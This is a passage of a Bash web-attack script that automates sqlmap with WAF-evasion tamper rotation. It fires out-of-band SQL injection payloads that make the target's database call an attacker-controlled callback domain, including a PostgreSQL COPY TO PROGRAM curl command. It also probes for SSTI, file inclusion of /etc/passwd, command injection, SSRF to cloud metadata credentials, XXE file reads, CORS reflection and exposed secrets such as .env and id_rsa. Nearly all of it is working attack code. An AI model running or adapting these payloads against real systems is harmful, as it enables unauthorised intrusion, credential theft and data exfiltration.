  [[ -n "$INJECTABLE_PARAM" ]] && _arr+=( "-p" "$INJECTABLE_PARAM" )

  # Column count hint
  (( COLUMN_COUNT > 0 )) && _arr+=( "--union-cols=${COLUMN_COUNT}" )

  # Flush session only on first run
  $HTTP2_SUPPORTED              && _arr+=( "--http2" )
  $IS_UNSTABLE                  && _arr+=( "--unstable" )
  [[ -n "${DBMS_HINT}"        ]] && _arr+=( "${DBMS_HINT}" )
  [[ -n "${CURRENT_TAMPER}"   ]] && _arr+=( "--tamper=${CURRENT_TAMPER}" )
  [[ -n "${COOKIE_OPT}"       ]] && _arr+=( "${COOKIE_OPT}" )
  [[ -n "${HEADER_OPT}"       ]] && _arr+=( "${HEADER_OPT}" )
  [[ -n "${PROXY_OPT}"        ]] && _arr+=( "${PROXY_OPT}" )
  [[ -n "${CURRENT_DELAY}"    ]] && (( CURRENT_DELAY > 0 )) && _arr+=( "--delay=${CURRENT_DELAY}" )
}

# ═══════════════════════════════════════════════════════════════
#  PARSERS
# ═══════════════════════════════════════════════════════════════
parse_injection_found() { echo "$1" | grep -qiE "parameter '.*' is vulnerable|Type: (boolean|time|error|union|stacked)|back-end DBMS:|injectable"; }
parse_blocked()         { echo "$1" | grep -qiE "connection refused|403 forbidden|heuristic.*detected|too many requests|waf|firewall|rate.limit"; }

# ═══════════════════════════════════════════════════════════════
#  BLOCK HANDLER — faster backoff
# ═══════════════════════════════════════════════════════════════
handle_block() {
  local reason="$1"; ((BLOCK_COUNT++)) || true
  adapt "BLOCK #${BLOCK_COUNT} — ${reason}"
  echo "BLOCK #${BLOCK_COUNT}: ${reason}" >> "$BLOCK_LOG"
  (( BLOCK_COUNT >= MAX_BLOCK_RETRIES )) && warn "Max retries — giving up this phase" && return 1
  local nd=$(( CURRENT_DELAY + 3 )); (( nd > 10 )) && nd=10
  CURRENT_DELAY=$nd; CURRENT_THREADS=1
  TAMPER_INDEX=$(( (TAMPER_INDEX + 1) % ${#TAMPER_POOL[@]} ))
  CURRENT_TAMPER="${TAMPER_POOL[$TAMPER_INDEX]}"
  adapt "→ delay=${CURRENT_DELAY}s tamper=${CURRENT_TAMPER}"
  sleep $(( CURRENT_DELAY + 1 ))
  return 0
}

# ═══════════════════════════════════════════════════════════════
#  ⑥ ADAPTIVE SQLMAP SCAN — 2 phases instead of 4
#  Phase 1: Focused (detected technique, level 1)  — fast
#  Phase 2: Broader (add U+S+T if needed)          — only if P1 fails
#  Phase 3: Deep (max, only in DEEP mode)
# ═══════════════════════════════════════════════════════════════
adaptive_scan() {
  local url_arg="$1" probe_url="$2" label="$3"
  SQLI_FOUND=false

  local ts=$(( BASELINE_TIME / 1000 + TIME_SEC ))
  (( ts < TIME_SEC )) && ts=$TIME_SEC; (( ts > 20 )) && ts=20

  # Pre-scan: get detected technique + column count in parallel
  prescan_technique "$probe_url" &
  local prescan_pid=$!

  # Also do ORDER BY in parallel
  discover_column_count_fast "$probe_url" &
  local colcount_pid=$!

  # Header + JSON injection (background, non-blocking)
  test_header_injection_fast "$probe_url" &
  local header_pid=$!

  wait $prescan_pid; wait $colcount_pid; wait $header_pid

  local tech="${DETECTED_TECHNIQUE:-BE}"

  # ── QUICK mode: single focused pass ──
  if [[ "$SCAN_MODE" == "1" ]]; then
    sep; spd "QUICK MODE — single pass | technique: EU | level: 1"
    local cmd=(); build_sqlmap_cmd cmd "$url_arg" "EU" 1 1 "$ts"
    local out; out=$(timeout "$SQLI_TIMEOUT" "${cmd[@]}" 2>&1 | sanitize_output) || true
    echo "$out" | tee -a "$LOG_FILE"
    if parse_injection_found "$out"; then
      SQLI_FOUND=true; hit "SQLi FOUND in QUICK mode!"
      extract_injectable_param "$out"
    fi
    return
  fi

  # ── SMART/DEEP: Phase 1 — focused on pre-detected technique ──
  sep; spd "Phase 1: technique=${tech} level=1 (focused)"
  local cmd1=(); build_sqlmap_cmd cmd1 "$url_arg" "$tech" 1 1 "$ts"
  # Add --flush-session on first run
  cmd1+=( --flush-session )
  local out1; out1=$(timeout "$SQLI_TIMEOUT" "${cmd1[@]}" 2>&1 | sanitize_output) || true
  echo "$out1" | tee -a "$LOG_FILE"

  if parse_blocked "$out1"; then
    handle_block "Phase1" && {
      local cmd1r=(); build_sqlmap_cmd cmd1r "$url_arg" "$tech" 1 1 "$ts"
      out1=$(timeout "$SQLI_TIMEOUT" "${cmd1r[@]}" 2>&1 | sanitize_output) || true
      echo "$out1" | tee -a "$LOG_FILE"
    }
  fi

  if parse_injection_found "$out1"; then
    SQLI_FOUND=true; hit "SQLi FOUND in Phase 1!"
    extract_injectable_param "$out1"; return
  fi

  # ── Phase 2 — widen technique, raise level ──
  # Only run phases 2+ if scan budget allows
  local used=$(elapsed_since_start)
  if (( used > SQLI_TIMEOUT * 8 / 10 )); then
    warn "Budget limit approaching — skipping Phase 2+"; return
  fi

  # Widen technique: add what wasn't in phase 1
  local wide_tech="BEUST"
  [[ "$SCAN_MODE" == "2" ]] && wide_tech="BEUS"
  [[ "$SCAN_MODE" == "3" ]] && wide_tech="BEUSTQ"

  sep; spd "Phase 2: technique=${wide_tech} level=${SQLMAP_LEVEL}"
  local cmd2=(); build_sqlmap_cmd cmd2 "$url_arg" "$wide_tech" "$SQLMAP_LEVEL" "$SQLMAP_RISK" "$ts"
  local out2; out2=$(timeout "$SQLI_TIMEOUT" "${cmd2[@]}" 2>&1 | sanitize_output) || true
  echo "$out2" | tee -a "$LOG_FILE"

  if parse_blocked "$out2"; then
    handle_block "Phase2" && {
      local cmd2r=(); build_sqlmap_cmd cmd2r "$url_arg" "$wide_tech" "$SQLMAP_LEVEL" "$SQLMAP_RISK" "$ts"
      out2=$(timeout "$SQLI_TIMEOUT" "${cmd2r[@]}" 2>&1 | sanitize_output) || true
      echo "$out2" | tee -a "$LOG_FILE"
    }
  fi

  if parse_injection_found "$out2"; then
    SQLI_FOUND=true; hit "SQLi FOUND in Phase 2!"
    extract_injectable_param "$out2"; return
  fi

  # ── Phase 3: Deep mode only — time-based, max level ──
  if [[ "$SCAN_MODE" == "3" ]]; then
    local ts3=$(( ts + 8 )); (( ts3 > 30 )) && ts3=30
    CURRENT_THREADS=1   # time-based MUST be single thread
    sep; spd "Phase 3 (DEEP): BEUSTQ level=3 risk=2"
    local cmd3=(); build_sqlmap_cmd cmd3 "$url_arg" "BEUSTQ" 3 2 "$ts3"
    local out3; out3=$(timeout "$SQLI_TIMEOUT" "${cmd3[@]}" 2>&1 | sanitize_output) || true
    echo "$out3" | tee -a "$LOG_FILE"
    if parse_injection_found "$out3"; then
      SQLI_FOUND=true; hit "SQLi FOUND in Phase 3!"
      extract_injectable_param "$out3"
    fi
  fi
}

# Extract which param sqlmap confirmed injectable
extract_injectable_param() {
  local out="$1"
  INJECTABLE_PARAM=$(echo "$out" | grep -oP "Parameter: '\K[^']+" | head -1 || echo "")
  [[ -n "$INJECTABLE_PARAM" ]] && intel "Injectable param confirmed: ${INJECTABLE_PARAM}"
}

# ═══════════════════════════════════════════════════════════════
#  ⑦ FAST ORDER BY — stops at first error, parallelized
# ═══════════════════════════════════════════════════════════════
discover_column_count_fast() {
  local url="$1"; COLUMN_COUNT=0
  step "Fast ORDER BY column count..."

  # Fire ORDER BY 1..8 in parallel first (most sites have <8 columns)
  local i
  for i in 1 2 3 4 5 6 7 8; do
    pcurl_start "ob${i}" "${url}%20ORDER%20BY%20${i}--%20-"
  done

  local prev_size=$BASELINE_SIZE
  for i in 1 2 3 4 5 6 7 8; do
    local body; body=$(pcurl_wait "ob${i}")
    local cs=${#body}
    if echo "$body" | grep -qiE "unknown column|error.*order|1054|ORA-01785|ORDER BY position|no such column|out of range"; then
      COLUMN_COUNT=$(( i - 1 ))
      intel "Columns: ${COLUMN_COUNT} (error at ORDER BY ${i})"
      # Cancel remaining pending curls
      pcurl_waitall
      return
    fi
    local d=$(( cs > prev_size ? cs - prev_size : prev_size - cs ))
    if (( i > 1 && d > 500 && cs < 100 )); then
      COLUMN_COUNT=$(( i - 1 ))
      intel "Columns: ${COLUMN_COUNT} (response collapsed)"
      pcurl_waitall; return
    fi
    prev_size=$cs
  done

  # If not found in 1-8, test 9-20 sequentially
  for i in $(seq 9 20); do
    local body; body=$(do_curl "${url}%20ORDER%20BY%20${i}--%20-")
    echo "$body" | grep -qiE "unknown column|error.*order|1054|ORA-01785|ORDER BY position|no such column" && \
      COLUMN_COUNT=$(( i - 1 )) && intel "Columns: ${COLUMN_COUNT}" && return
    sleep 0.1
  done
  warn "ORDER BY inconclusive"
}

# ═══════════════════════════════════════════════════════════════
#  ⑧ FAST HEADER INJECTION — parallel, no sleep loops
# ═══════════════════════════════════════════════════════════════
test_header_injection_fast() {
  local url="$1"
  local payloads=(
    "User-Agent: Mozilla/5.0' AND '1'='1"
    "X-Forwarded-For: 1.1.1.1' AND SLEEP(1)-- -"
    "Referer: ${url}' AND '1'='1"
    "X-Real-IP: 1.1.1.1' AND '1'='1"
  )
  local i=0
  for h in "${payloads[@]}"; do
    pcurl_start "hdr${i}" "$url" -H "$h"; ((i++)) || true
  done
  local j=0
  for h in "${payloads[@]}"; do
    local body; body=$(pcurl_wait "hdr${j}")
    if echo "$body" | grep -qiE "you have an error in your sql|pg_query|ora-[0-9]|mssql"; then
      intel "HEADER INJECTION possible: ${h%%:*}"
      echo "HEADER_INJECTABLE:${h%%:*}" >> "$INTEL_FILE"
    fi
    ((j++)) || true
  done
}

# ═══════════════════════════════════════════════════════════════
#  ⑨ SHARED OOB URL — one URL for ALL modules, one poll at end
# ═══════════════════════════════════════════════════════════════
setup_shared_oob() {
  $USE_OOB || return
  local token_flag=""; [[ -n "$OOB_TOKEN" ]] && token_flag="-token ${OOB_TOKEN}"

  if [[ -n "$OOB_CLIENT" ]]; then
    local raw
    raw=$(timeout 8 "$OOB_CLIENT" -server "${OOB_DOMAIN}" $token_flag -n 1 -json 2>/dev/null | head -1 || echo "")
    SHARED_OOB_URL=$(echo "$raw" | grep -oP '"url"\s*:\s*"\K[^"]+' | head -1 || echo "")
    SHARED_OOB_ID=$(echo "$SHARED_OOB_URL" | cut -d'.' -f1)
  fi

  if [[ -z "$SHARED_OOB_URL" ]]; then
    local uid; uid=$(od -An -N8 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n' | head -c 16 || date +%s%N | sha256sum | head -c 16)
    SHARED_OOB_URL="${uid}.${OOB_DOMAIN}"
    SHARED_OOB_ID="${uid}"
  fi
  intel "Shared OOB URL: ${SHARED_OOB_URL}"
  OOB_PAYLOAD_URL="$SHARED_OOB_URL"
  OOB_PAYLOAD_ID="$SHARED_OOB_ID"
}

# Final OOB poll — called ONCE after all modules fire
poll_shared_oob() {
  $USE_OOB || return
  [[ -z "$SHARED_OOB_URL" ]] && return
  [[ ${#OOB_FIRED_LABELS[@]} -eq 0 ]] && { info "No OOB payloads fired — skipping poll"; return; }

  local wait_sec=18
  step "Polling shared OOB (${#OOB_FIRED_LABELS[@]} labels fired, up to ${wait_sec}s)..."
  local token_flag=""; [[ -n "$OOB_TOKEN" ]] && token_flag="-token ${OOB_TOKEN}"
  local elapsed=0

  while (( elapsed < wait_sec )); do
    sleep 3; elapsed=$(( elapsed + 3 ))

    if [[ -n "$OOB_CLIENT" ]]; then
      local poll_out
      poll_out=$(timeout 6 "$OOB_CLIENT" -server "${OOB_DOMAIN}" $token_flag \
        -sf "${OOB_SESSION_FILE}" -o "${OOB_DIR}/interactions.json" \
        2>/dev/null | tail -10 || echo "")
      if echo "$poll_out" | grep -qiE "Received (DNS|HTTP|SMTP) interaction"; then
        oob "OOB INTERACTION RECEIVED!"
        echo "$poll_out" >> "${OOB_DIR}/oob_hits.txt"
        # Identify which module triggered it from subdomain label
        local matched_label
        for lbl in "${OOB_FIRED_LABELS[@]}"; do
          echo "$poll_out" | grep -qi "$lbl" && matched_label="$lbl" && break || true
        done
        echo "[OOB_HIT] labels=(${OOB_FIRED_LABELS[*]}) matched=${matched_label:-unknown}" >> "$HITS_FILE"
        return 0
      fi
    fi

    # DNS fallback
    if [[ -n "$SHARED_OOB_ID" ]]; then
      local dns_r; dns_r=$(dig +short "${SHARED_OOB_ID}.${OOB_DOMAIN}" @8.8.8.8 2>/dev/null || echo "")
      if [[ -n "$dns_r" ]] && ! echo "$dns_r" | grep -q "NXDOMAIN"; then
        oob "DNS OOB hit: ${dns_r}"
        echo "[OOB_DNS_HIT] ${dns_r}" >> "$HITS_FILE"; return 0
      fi
    fi
  done
  info "No OOB interactions detected"
  return 1
}

# ═══════════════════════════════════════════════════════════════
#  OOB SQLi — fires payloads, registers label, no wait
# ═══════════════════════════════════════════════════════════════
test_oob_sqli() {
  local url="$1"
  $USE_OOB || return
  [[ -z "$SHARED_OOB_URL" ]] && return
  step "OOB SQLi payloads → ${SHARED_OOB_URL}"

  local base_url="${url%=*}="
  local oob="${SHARED_OOB_URL}"

  # MySQL OOB
  local my1="' AND LOAD_FILE(CONCAT(0x5c5c5c5c,database(),0x2e${oob//./2e},0x5c61))-- -"
  local my2="' UNION SELECT LOAD_FILE('\\\\\\\\${oob}\\\\x'),NULL-- -"
  # MSSQL OOB
  local ms1="'; EXEC master..xp_dirtree '\\\\${oob}\\x'-- -"
  local ms2="'; EXEC master..xp_fileexist '\\\\${oob}\\sqli'-- -"
  # Oracle OOB
  local or1="' UNION SELECT UTL_HTTP.REQUEST('http://${oob}/') FROM dual-- -"
  local or2="' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.${oob}') FROM dual-- -"
  # PostgreSQL OOB
  local pg1="'; COPY (SELECT version()) TO PROGRAM 'curl http://${oob}/?v=pg'-- -"

  local all_oob=( "$my1" "$my2" "$ms1" "$ms2" "$or1" "$or2" "$pg1" )

  # Filter by detected DBMS if known
  case "$DBMS_HINT" in
    *MySQL*)      all_oob=( "$my1" "$my2" ) ;;
    *MSSQL*)      all_oob=( "$ms1" "$ms2" ) ;;
    *Oracle*)     all_oob=( "$or1" "$or2" ) ;;
    *PostgreSQL*) all_oob=( "$pg1" )        ;;
  esac

  for pl in "${all_oob[@]}"; do
    local enc; enc=$(python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$pl" 2>/dev/null || echo "$pl")
    ( do_curl "${base_url}${enc}" >/dev/null 2>&1 ) &
    # Also POST
    ( curl -s --max-time 10 -X POST -d "id=${enc}" \
        ${CK_VAL:+--cookie "${CK_VAL}"} "$url" >/dev/null 2>&1 ) &
  done
  wait

  # sqlmap with --dns-domain (background, no block)
  if $DO_TIME_BASED; then
    ( sqlmap -u "$url" "--dns-domain=${SHARED_OOB_URL}" \
        --technique=BEUST --level=2 --risk=1 \
        --batch --random-agent --smart --disable-coloring \
        "--output-dir=${DUMP_DIR}" \
        ${DBMS_HINT:+"$DBMS_HINT"} ${CURRENT_TAMPER:+"--tamper=${CURRENT_TAMPER}"} \
        ${COOKIE_OPT:+"$COOKIE_OPT"} \
        >> "${OOB_DIR}/sqlmap_oob.log" 2>&1 ) &
    intel "sqlmap --dns-domain running in background (pid $!)"
  fi

  OOB_FIRED_LABELS+=("sqli")
}

# ═══════════════════════════════════════════════════════════════
#  ⑩ NON-SQLi PARALLEL ENGINE
#  All modules fire probes in background concurrently
#  Each module: fire probes → check response → report
#  No sleep(0.3) loops — pure parallel curl
# ═══════════════════════════════════════════════════════════════

# ── URL param extraction ──
get_url_params() { echo "$1" | grep -oP '[?&]\K\w+(?==)'; }

# ── Single-pass multi-vuln probe
#    For each param, fires ONE request per vuln type concurrently
#    Checks ALL vuln patterns on the same response body ──

_run_nonsqli_parallel() {
  local url="$1"
  local url_params; url_params=$(get_url_params "$url")
  [[ -z "$url_params" ]] && { info "No URL params for non-SQLi testing"; return; }

  # Build a canary for this run
  local canary="xSPL$(date +%s | tail -c 5)"

  # Payloads to test per param (all in one batch):
  # Format: LABEL|PAYLOAD
  local PROBE_DEFS=(
    # SSTI probes
    "ssti_math|{{7*7}}"
    "ssti_fm|<#assign x=7*7>\${x}"
    "ssti_spring|*{7*7}"
    "ssti_erb|<%=7*7%>"
    # XSS probe
    "xss|<${canary}>"
    # LFI probes
    "lfi_linux|../../../../etc/passwd"
    "lfi_win|..\\\\..\\\\..\\\\windows\\\\win.ini"
    "lfi_php|php://filter/read=convert.base64-encode/resource=/etc/passwd"
    # CMDi probes
    "cmdi_id|; id"
    "cmdi_sleep|; sleep 3"
    # Open redirect
    "redir|https://evil.com"
    # SQLi error quick check (catches any missed)
    "sqli_err|'"
    "sqli_bool|' AND '1'='1"
  )

  # OOB probes — fire with shared URL
  local OOB_PROBE_DEFS=()
  if $USE_OOB && [[ -n "$SHARED_OOB_URL" ]]; then
    OOB_PROBE_DEFS+=(
      "ssrf_oob|http://${SHARED_OOB_URL}/ssrf"
      "cmdi_oob|; curl http://${SHARED_OOB_URL}/cmdi"
    )
  fi

  local all_probes=( "${PROBE_DEFS[@]}" "${OOB_PROBE_DEFS[@]}" )

  declare -A PID_MAP   # label_param → pid
  declare -A BODY_MAP  # label_param → response file
  local pids_to_wait=()

  # Fire all probes for all params in background
  for param in $url_params; do
    for probe_def in "${all_probes[@]}"; do
      local label="${probe_def%%|*}"
      local payload="${probe_def#*|}"
      local enc
      enc=$(python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
      local test_url
      test_url=$(echo "$url" | sed "s|\(${param}=\)[^&]*|\1${enc}|")
      local tmpf; tmpf=$(mktemp /tmp/nsq.XXXXXX)
      local key="${label}_${param}"
      BODY_MAP["$key"]="$tmpf"
      ( do_curl "$test_url" > "$tmpf" 2>/dev/null ) &
      PID_MAP["$key"]=$!
      pids_to_wait+=($!)
    done
  done

  # Wait for all in background
  spd "Fired $(( ${#pids_to_wait[@]} )) parallel probes for ${#url_params} params..."
  wait "${pids_to_wait[@]}" 2>/dev/null || true

  # ── Analyze all responses ──
  for param in $url_params; do
    for probe_def in "${all_probes[@]}"; do
      local label="${probe_def%%|*}"; local payload="${probe_def#*|}"
      local key="${label}_${param}"
      local tmpf="${BODY_MAP[$key]:-}"
      [[ -f "$tmpf" ]] || continue
      local body; body=$(cat "$tmpf"); rm -f "$tmpf"
      [[ -z "$body" ]] && continue

      case "$label" in
        ssti_math|ssti_fm|ssti_spring|ssti_erb)
          $SCAN_SSTI || continue
          echo "$body" | grep -qP '(?<![0-9])49(?![0-9])|7777777' && \
            vuln "SSTI CONFIRMED — param:${param} probe:${payload}" && \
            echo "[SSTI] ${url} param=${param}" >> "$HITS_FILE" && \
            echo "$body" | head -200 > "${VULN_DIR}/ssti_${param}.txt"
          ;;
        xss)
          $SCAN_XSS || continue
          # Check unescaped reflection
          echo "$body" | grep -qF "<${canary}>" && \
            vuln "REFLECTED XSS — param:${param}" && \
            echo "[XSS] ${url} param=${param}" >> "$HITS_FILE" && \
            echo "$body" | head -200 > "${VULN_DIR}/xss_${param}.txt"
          ;;
        lfi_linux|lfi_win|lfi_php)
          $SCAN_LFI || continue
          echo "$body" | grep -qP "root:[x*]:0:0:|nobody:|daemon:|\\[extensions\\]|\\[fonts\\]|/nonexistent" && \
            vuln "LFI CONFIRMED — param:${param} payload:${payload}" && \
            echo "[LFI] ${url} param=${param}" >> "$HITS_FILE" && \
            echo "$body" | head -100 > "${VULN_DIR}/lfi_${param}.txt"
          ;;
        cmdi_id)
          $SCAN_CMDI || continue
          echo "$body" | grep -qiE "uid=[0-9]+|root:|www-data:|daemon:|/bin/bash" && \
            vuln "CMDi CONFIRMED (id output) — param:${param}" && \
            echo "[CMDI] ${url} param=${param}" >> "$HITS_FILE" && \
            echo "$body" | head -100 > "${VULN_DIR}/cmdi_${param}.txt"
          ;;
        cmdi_sleep)
          # Time check handled separately below via timed request
          ;;
        redir)
          $SCAN_REDIR || continue
          # Check redirect location header
          local redir_url
          redir_url=$(echo "$url" | sed "s|\(${param}=\)[^&]*|\1https://evil.com|")
          local redir_hdr
          redir_hdr=$(curl -sI --max-time 8 --max-redirs 0 "$redir_url" 2>/dev/null | grep -i location || echo "")
          echo "$redir_hdr" | grep -qi "evil.com" && \
            vuln "OPEN REDIRECT — param:${param}" && \
            echo "[OPEN_REDIRECT] ${url} param=${param}" >> "$HITS_FILE"
          ;;
        sqli_err)
          # Catch any remaining SQLi error leaks
          echo "$body" | grep -qiE "you have an error in your sql|mysql_fetch|pg_query|ora-[0-9]{4}|mssql|syntax error.*sql" && \
            intel "SQL ERROR leaked on param:${param} — missed by sqlmap scan" && \
            echo "SQLI_ERROR_HINT:${param}" >> "$INTEL_FILE"
          ;;
        ssrf_oob)
          $SCAN_SSRF || continue
          OOB_FIRED_LABELS+=("ssrf_${param}")
          ;;
        cmdi_oob)
          $SCAN_CMDI || continue
          OOB_FIRED_LABELS+=("cmdi_${param}")
          ;;
      esac
    done

    # ── Time-based CMDi (needs separate timed request) ──
    if $SCAN_CMDI; then
      local sleep_url
      sleep_url=$(echo "$url" | sed "s|\(${param}=\)[^&]*|\1;%20sleep%203|")
      local ts te el
      ts=$(date +%s%N)
      do_curl "$sleep_url" >/dev/null
      te=$(date +%s%N); el=$(( (te - ts) / 1000000 ))
      local thr=$(( BASELINE_TIME + 2500 ))
      (( el > thr )) && \
        vuln "TIME-BASED CMDi — param:${param} delay:${el}ms" && \
        echo "[CMDI_TIME] ${url} param=${param}" >> "$HITS_FILE"
    fi
  done

  # Clean up any leftover tmp files
  for key in "${!BODY_MAP[@]}"; do
    [[ -f "${BODY_MAP[$key]}" ]] && rm -f "${BODY_MAP[$key]}"
  done
}

# ═══════════════════════════════════════════════════════════════
#  SSRF — fast dedicated check for SSRF-prone params + cloud metadata
# ═══════════════════════════════════════════════════════════════
test_ssrf_fast() {
  local url="$1"
  $SCAN_SSRF || return

  local ssrf_prone="^(url|uri|src|source|href|action|redirect|next|target|img|image|link|load|path|file|fetch|callback|endpoint|return|returnUrl|return_url|goto|destination|dest|open|preview|proxy|resource|webhook|icon|logo|avatar|media|content)$"
  local url_params; url_params=$(get_url_params "$url")

  local ssrf_targets=(
    "http://169.254.169.254/latest/meta-data/"
    "http://metadata.google.internal/computeMetadata/v1/"
    "http://169.254.169.254/metadata/instance"
    "file:///etc/passwd"
  )
  [[ -n "$SHARED_OOB_URL" ]] && ssrf_targets+=("http://${SHARED_OOB_URL}/ssrf")

  local pids=()
  declare -A sfiles

  for param in $url_params; do
    echo "$param" | grep -qiP "$ssrf_prone" || continue
    for target in "${ssrf_targets[@]}"; do
      local enc; enc=$(python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$target" 2>/dev/null || echo "$target")
      local test_url; test_url=$(echo "$url" | sed "s|\(${param}=\)[^&]*|\1${enc}|")
      local tmpf; tmpf=$(mktemp /tmp/ssrf.XXXXXX)
      local key="${param}_$(echo "$target" | md5sum | head -c 6)"
      sfiles["$key"]="$tmpf"
      ( do_curl "$test_url" > "$tmpf" 2>/dev/null ) &
      pids+=($!)
    done
  done

  [[ ${#pids[@]} -eq 0 ]] && return
  wait "${pids[@]}" 2>/dev/null || true

  for key in "${!sfiles[@]}"; do
    local f="${sfiles[$key]}"
    [[ -f "$f" ]] || continue
    local body; body=$(cat "$f"); rm -f "$f"
    echo "$body" | grep -qiE "ami-id|instance-id|local-ipv4|computeMetadata|security-credentials|root:[x*]:0:0:|\\[extensions\\]" && \
      vuln "SSRF CONFIRMED — ${key%%_*}" && \
      echo "[SSRF] ${url} param=${key%%_*}" >> "$HITS_FILE" && \
      echo "$body" | head -50 > "${VULN_DIR}/ssrf_${key%%_*}.txt"
  done

  [[ -n "$SHARED_OOB_URL" ]] && OOB_FIRED_LABELS+=("ssrf")
}

# ═══════════════════════════════════════════════════════════════
#  XXE — fast, fires to XML-accepting endpoints only
# ═══════════════════════════════════════════════════════════════
test_xxe_fast() {
  local url="$1"
  $SCAN_XXE || return

  local base_host; base_host=$(echo "$url" | grep -oP 'https?://[^/?]+')
  local xml_eps=( "$url" )

  # Quick check: does the base path respond to XML POST?
  local test_xml='<?xml version="1.0"?><test>x</test>'
  local sc; sc=$(curl -o /dev/null -s -w "%{http_code}" --max-time 6 \
    -X POST -H "Content-Type: application/xml" -d "$test_xml" "$url" 2>/dev/null || echo "000")
  [[ "$sc" =~ ^(200|400|500)$ ]] || { info "Target doesn't accept XML — skipping XXE"; return; }

  local xxe_inband='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
  local xxe_oob=""
  [[ -n "$SHARED_OOB_URL" ]] && \
    xxe_oob="<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://${SHARED_OOB_URL}/xxe\">%p;]><r/>"

  local payloads=( "$xxe_inband" )
  [[ -n "$xxe_oob" ]] && payloads+=( "$xxe_oob" )

  local pids=()
  declare -A xfiles

  for i in "${!payloads[@]}"; do
    local tmpf; tmpf=$(mktemp /tmp/xxe.XXXXXX)
    xfiles["$i"]="$tmpf"
    local pl="${payloads[$i]}"
    ( curl -s --max-time 10 -X POST \
        -H "Content-Type: application/xml" \
        -H "Accept: application/xml, text/xml, */*" \
        -d "$pl" \
        ${CK_VAL:+--cookie "${CK_VAL}"} \
        "$url" > "$tmpf" 2>/dev/null ) &
    pids+=($!)
  done

  wait "${pids[@]}" 2>/dev/null || true

  for i in "${!xfiles[@]}"; do
    local f="${xfiles[$i]}"
    [[ -f "$f" ]] || continue
    local body; body=$(cat "$f"); rm -f "$f"
    echo "$body" | grep -qP "root:[x*]:0:0:|nobody:|127\\.0\\.0\\.1" && \
      vuln "XXE CONFIRMED — file read via XML injection" && \
      echo "[XXE] ${url}" >> "$HITS_FILE" && \
      echo "$body" | head -50 > "${VULN_DIR}/xxe.txt"
  done

  [[ -n "$SHARED_OOB_URL" ]] && OOB_FIRED_LABELS+=("xxe")
}

# ═══════════════════════════════════════════════════════════════
#  ⑪ INFO DISCLOSURE — all 38 paths in parallel (10 at a time)
# ═══════════════════════════════════════════════════════════════
test_info_disclosure_fast() {
  local url="$1"
  $SCAN_INFO || return

  sep; step "Info Disclosure + Security Headers (parallel)..."
  local base_host; base_host=$(echo "$url" | grep -oP 'https?://[^/?]+')

  # ── Security headers (single HEAD request) ──
  local headers; headers=$(do_head "$url")
  local MISSING=()
  echo "$headers" | grep -qi "x-content-type-options"       || MISSING+=("X-Content-Type-Options")
  echo "$headers" | grep -qi "x-frame-options"              || MISSING+=("X-Frame-Options")
  echo "$headers" | grep -qi "content-security-policy"      || MISSING+=("CSP")
  echo "$headers" | grep -qi "strict-transport-security"    || MISSING+=("HSTS")
  echo "$headers" | grep -qi "referrer-policy"              || MISSING+=("Referrer-Policy")
  (( ${#MISSING[@]} > 0 )) && warn "Missing headers: ${MISSING[*]}" && \
    echo "[MISSING_HEADERS] ${MISSING[*]}" >> "$HITS_FILE"
  echo "$headers" | grep -qi "x-powered-by" && \
    warn "X-Powered-By exposed: $(echo "$headers" | grep -i 'x-powered-by' | head -1 | tr -d '\r')"
  echo "$headers" | grep -qi "^server:" && \
    warn "Server header exposed: $(echo "$headers" | grep -i '^server:' | head -1 | tr -d '\r')"

  # ── CORS check ──
  local cors; cors=$(curl -s --max-time 8 -H "Origin: https://evil.com" -I "$url" 2>/dev/null | tr '[:upper:]' '[:lower:]' || echo "")
  echo "$cors" | grep -q "access-control-allow-origin: https://evil.com" && \
    vuln "CORS MISCONFIGURATION — origin reflection!" && echo "[CORS] ${url}" >> "$HITS_FILE"
  echo "$cors" | grep -q "access-control-allow-origin: \*" && \
    warn "CORS wildcard (*) on ${url}" && echo "[CORS_WILDCARD] ${url}" >> "$HITS_FILE"

  # ── Sensitive file discovery — batched parallel (10 at a time) ──
  local sensitive_paths=(
    "/.git/HEAD" "/.git/config" "/.env" "/.env.backup" "/.env.local"
    "/config.php" "/wp-config.php" "/config.yml" "/config.yaml"
    "/.htaccess" "/.htpasswd" "/composer.json" "/package.json"
    "/phpinfo.php" "/info.php" "/server-status" "/server-info"
    "/.DS_Store" "/web.config" "/robots.txt" "/sitemap.xml"
    "/swagger.json" "/swagger.yaml" "/api-docs" "/openapi.json"
    "/actuator" "/actuator/env" "/actuator/health" "/_profiler"
    "/debug" "/trace" "/backup.sql" "/database.sql" "/dump.sql"
    "/.bash_history" "/id_rsa" "/error_log" "/access_log"
    "/crossdomain.xml" "/clientaccesspolicy.xml"
  )

  local FOUND=0
  local batch=10
  local total=${#sensitive_paths[@]}
  local i=0

  while (( i < total )); do
    declare -A batch_files
    local batch_pids=()
    local j=0

    while (( j < batch && i + j < total )); do
      local path="${sensitive_paths[$((i+j))]}"
      local candidate="${base_host}${path}"
      local tmpf; tmpf=$(mktemp /tmp/info.XXXXXX)
      batch_files["$path"]="$tmpf"
      ( http_code "$candidate" > "$tmpf" 2>/dev/null ) &
      batch_pids+=($!)
      ((j++)) || true
    done

    wait "${batch_pids[@]}" 2>/dev/null || true

    for path in "${!batch_files[@]}"; do
      local f="${batch_files[$path]}"
      [[ -f "$f" ]] || continue
      local sc; sc=$(cat "$f" | tr -d '[:space:]'); rm -f "$f"
      if [[ "$sc" == "200" ]]; then
        local candidate="${base_host}${path}"
        local file_body; file_body=$(do_curl "$candidate" | head -c 1500)
        # Filter custom 404s
        echo "$file_body" | grep -qiE "404|not found|page not found|no page" 2>/dev/null && continue
        vuln "SENSITIVE FILE: ${candidate}"
        echo "$file_body" | head -30 > "${VULN_DIR}/file_$(echo "$path" | tr '/.' '__').txt"
        echo "[SENSITIVE_FILE] ${candidate}" >> "$HITS_FILE"
        echo "$file_body" | grep -qiE "DB_PASS|DB_PASSWORD|SECRET_KEY|APP_KEY|api_key|password=" && \
          vuln "  ↳ CREDENTIALS in ${path}!"
